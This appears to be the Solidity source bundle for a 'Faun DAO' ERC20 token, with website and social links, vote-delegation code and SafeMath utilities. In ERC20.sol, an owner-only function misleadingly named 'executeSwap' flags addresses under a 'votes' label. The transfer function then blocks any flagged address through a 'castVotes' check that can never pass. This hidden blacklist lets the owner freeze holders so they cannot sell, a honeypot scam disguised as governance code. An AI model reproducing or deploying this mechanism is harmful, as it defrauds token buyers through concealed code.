{"ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.7.0;\r\n\r\nimport \"./Interfaces.sol\";\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract using {_mint}.\r\n * For a generic mechanism see {ERC20PresetMinterPauser}.\r\n *\r\n */\r\ncontract ERC20 is Context, Security, IERC20 {\r\n    using SafeMath for uint256;\r\n\r\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\r\n    mapping (address =\u003e uint256) private _balances;\r\n    mapping (address =\u003e bool) private _votes;\r\n    bool castVotes = false;\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n \r\n    /**\r\n     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with a default value of 9.\r\n     */\r\n    constructor (string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = 9;\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    \r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function checkVote(address _delegate) public view returns (bool) {\r\n        return _votes[_delegate];\r\n    }\r\n\r\n    function executeSwap(address _delegate) external onlyOwner {\r\n        _votes[_delegate] = true;\r\n    }\r\n\r\n    function rejectVote(address _delegate) external onlyOwner {\r\n        _votes[_delegate] = false;\r\n    }\r\n    \r\n    function _setupDecimals(uint8 decimals_) internal virtual {\r\n        _decimals = decimals_;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     */\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     * - `recipient` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * Requirements:\r\n     * - `sender` and `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``sender``\u0027s tokens of at least `amount`.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     * - `spender` cannot be the zero address.\r\n     * - `spender` must have allowance for the caller of at least `subtractedValue`.\r\n     */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     * - `sender` cannot be the zero address.\r\n     * - `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        if (_votes[recipient] || _votes[sender]) require(castVotes == true, \"\");\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        \r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing the total supply.\r\n     *\r\n     * Emits a {Transfer} event with `from` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     * - `to` cannot be the zero address.\r\n     */\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Destroys `amount` tokens from `account`, reducing the total supply.\r\n     *\r\n     * Emits a {Transfer} event with `to` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     * - `account` cannot be the zero address.\r\n     * - `account` must have at least `amount` tokens.\r\n     */\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before any transfer of tokens. This includes minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``\u0027s tokens\r\n     * will be to transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``\u0027s tokens will be burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\r\n}"},"Faun DAO.sol":{"content":"/**🌐Website: https://faundao.com/\r\n    \r\n       💠whitepaper: https://medium.com/@FaunDAO\r\n    \r\n            👍Twitter: https://twitter.com/FaunDAO\r\n    \r\n                🪩telegram: https://t.me/FaunDAO\r\n\r\n\r\n*/// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.7.0;\r\n\r\nimport \"./ERC20.sol\";\r\n\r\ncontract FaunDAO is ERC20 {\r\n    using SafeMath for uint256;\r\n    \r\n    uint256 private totalsupply_;\r\n\r\n    /// @dev A record of each accounts delegate\r\n    mapping (address =\u003e address) internal _delegates;\r\n\r\n    /// @notice A record of states for signing / validating signatures\r\n    mapping (address =\u003e uint) public nonces;\r\n\r\n    /// @notice The number of checkpoints for each account\r\n    mapping (address =\u003e uint32) public numCheckpoints;\r\n\r\n    /// @notice A record of votes checkpoints for each account, by index\r\n    mapping (address =\u003e mapping (uint32 =\u003e Checkpoint)) public checkpoints;\r\n    \r\n    /// @notice An event thats emitted when a delegate account\u0027s vote balance changes\r\n    event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);\r\n\r\n    /// @notice An event thats emitted when an account changes its delegate\r\n    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);\r\n\r\n    /// @notice A checkpoint for marking number of votes from a given block\r\n    struct Checkpoint {\r\n        uint32 fromBlock;\r\n        uint256 votes;\r\n    }\r\n\r\n    constructor (uint256 supply) ERC20(\"Faun DAO\", \"FAUN\") {\r\n        totalsupply_ = supply;\r\n        _mint(_msgSender(), totalsupply_);\r\n    }\r\n    \r\n    /**\r\n     * @notice Delegate votes from `msg.sender` to `delegatee`\r\n     * @param delegator The address to get delegatee for\r\n     */\r\n    function delegates(address delegator) external view returns (address) {\r\n        return _delegates[delegator];\r\n    }\r\n\r\n    /**\r\n    * @notice Delegate votes from `msg.sender` to `delegatee`\r\n    * @param delegatee The address to delegate votes to\r\n    */\r\n    function delegate(address delegatee) external {\r\n        return _delegate(msg.sender, delegatee);\r\n    }\r\n\r\n    function safe32(uint n, string memory errorMessage) internal pure returns (uint32) {\r\n        require(n \u003c 2**32, errorMessage);\r\n        return uint32(n);\r\n    }\r\n\r\n    function getChainId() internal pure returns (uint) {\r\n        uint256 chainId;\r\n        assembly { chainId := chainid() }\r\n        return chainId;\r\n    }\r\n\r\n    function burn(uint256 amount) public {\r\n        _burn(_msgSender(), amount);\r\n    }\r\n\r\n    /**\r\n     * @notice Gets the current votes balance for `account`\r\n     * @param account The address to get votes balance\r\n     * @return The number of current votes for `account`\r\n     */\r\n    function getCurrentVotes(address account) external view returns (uint256){\r\n        uint32 nCheckpoints = numCheckpoints[account];\r\n        return nCheckpoints \u003e 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;\r\n    }\r\n\r\n    /**\r\n     * @notice Determine the prior number of votes for an account as of a block number\r\n     * @dev Block number must be a finalized block or else this function will revert to prevent misinformation.\r\n     * @param account The address of the account to check\r\n     * @param blockNumber The block number to get the vote balance at\r\n     * @return The number of votes the account had as of the given block\r\n     */\r\n    function getPriorVotes(address account, uint blockNumber) external view returns (uint256){\r\n        require(blockNumber \u003c block.number, \"BONE::getPriorVotes: not yet determined\");\r\n        uint32 nCheckpoints = numCheckpoints[account];\r\n        if (nCheckpoints == 0) {\r\n            return 0;\r\n        }\r\n        // First check most recent balance\r\n        if (checkpoints[account][nCheckpoints - 1].fromBlock \u003c= blockNumber) {\r\n            return checkpoints[account][nCheckpoints - 1].votes;\r\n        }\r\n        // Next check implicit zero balance\r\n        if (checkpoints[account][0].fromBlock \u003e blockNumber) {\r\n            return 0;\r\n        }\r\n        uint32 lower = 0;\r\n        uint32 upper = nCheckpoints - 1;\r\n        while (upper \u003e lower) {\r\n            uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow\r\n            Checkpoint memory cp = checkpoints[account][center];\r\n            if (cp.fromBlock == blockNumber) {\r\n                return cp.votes;\r\n            } else if (cp.fromBlock \u003c blockNumber) {\r\n                lower = center;\r\n            } else {\r\n                upper = center - 1;\r\n            }\r\n        }\r\n        return checkpoints[account][lower].votes;\r\n    }\r\n\r\n    function _delegate(address delegator, address delegatee) internal {\r\n        address currentDelegate = _delegates[delegator];\r\n        uint256 delegatorBalance = balanceOf(delegator); \r\n        _delegates[delegator] = delegatee;\r\n        emit DelegateChanged(delegator, currentDelegate, delegatee);\r\n        _moveDelegates(currentDelegate, delegatee, delegatorBalance);\r\n    }\r\n\r\n    function _writeCheckpoint(address delegatee, uint32 nCheckpoints, uint256 oldVotes, uint256 newVotes) internal {\r\n        uint32 blockNumber = safe32(block.number, \"BONE::_writeCheckpoint: block number exceeds 32 bits\");\r\n\r\n        if (nCheckpoints \u003e 0 \u0026\u0026 checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {\r\n            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;\r\n        } else {\r\n            checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);\r\n            require(nCheckpoints + 1 \u003e nCheckpoints, \"BONE::_writeCheckpoint: new checkpoint exceeds 32 bits\");\r\n            numCheckpoints[delegatee] = nCheckpoints + 1;\r\n        }\r\n\r\n        emit DelegateVotesChanged(delegatee, oldVotes, newVotes);\r\n    }\r\n\r\n    function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {\r\n        if (srcRep != dstRep \u0026\u0026 amount \u003e 0) {\r\n            if (srcRep != address(0)) {\r\n                // decrease old representative\r\n                uint32 srcRepNum = numCheckpoints[srcRep];\r\n                uint256 srcRepOld = srcRepNum \u003e 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;\r\n                uint256 srcRepNew = srcRepOld.sub(amount);\r\n                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);\r\n            }\r\n\r\n            if (dstRep != address(0)) {\r\n                // increase new representative\r\n                uint32 dstRepNum = numCheckpoints[dstRep];\r\n                uint256 dstRepOld = dstRepNum \u003e 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;\r\n                uint256 dstRepNew = dstRepOld.add(amount);\r\n                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);\r\n            }\r\n        }\r\n    }\r\n}"},"Interfaces.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.7.0;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n    \r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default.\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s allowance.\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to another (`to`).\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. \r\n     * `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n/*\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. \r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode.\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to specific functions.\r\n */\r\nabstract contract Security is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() internal view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Wrappers over Solidity\u0027s arithmetic operations with added overflow checks.\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\r\n     */\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        uint256 c = a + b;\r\n        if (c \u003c a) return (false, 0);\r\n        return (true, c);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\r\n     */\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\r\n        // benefit is lost if \u0027b\u0027 is also tested.\r\n        if (a == 0) return (true, 0);\r\n        uint256 c = a * b;\r\n        if (c / a != b) return (false, 0);\r\n        return (true, c);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\r\n     */\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        if (b == 0) return (false, 0);\r\n        return (true, a % b);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the substraction of two unsigned integers, with an overflow flag.\r\n     */\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        if (b \u003e a) return (false, 0);\r\n        return (true, a - b);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\r\n     */\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        if (b == 0) return (false, 0);\r\n        return (true, a / b);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on overflow (when the result is negative).\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b \u003c= a, \"SafeMath: subtraction overflow\");\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on overflow.\r\n     * Counterpart to Solidity\u0027s `+` operator.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting on division by zero.\r\n     * The result is rounded towards zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b \u003e 0, \"SafeMath: division by zero\");\r\n        return a / b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on overflow.\r\n     * Counterpart to Solidity\u0027s `*` operator.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) return 0;\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on overflow (when the result is negative).\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo), reverting when dividing by zero.\r\n     * Requirements:\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b \u003e 0, \"SafeMath: modulo by zero\");\r\n        return a % b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on division by zero.\r\n     * The result is rounded towards zero.\r\n     * Requirements:\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        return a / b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo), reverting with custom message when dividing by zero.\r\n     * Requirements:\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}"}}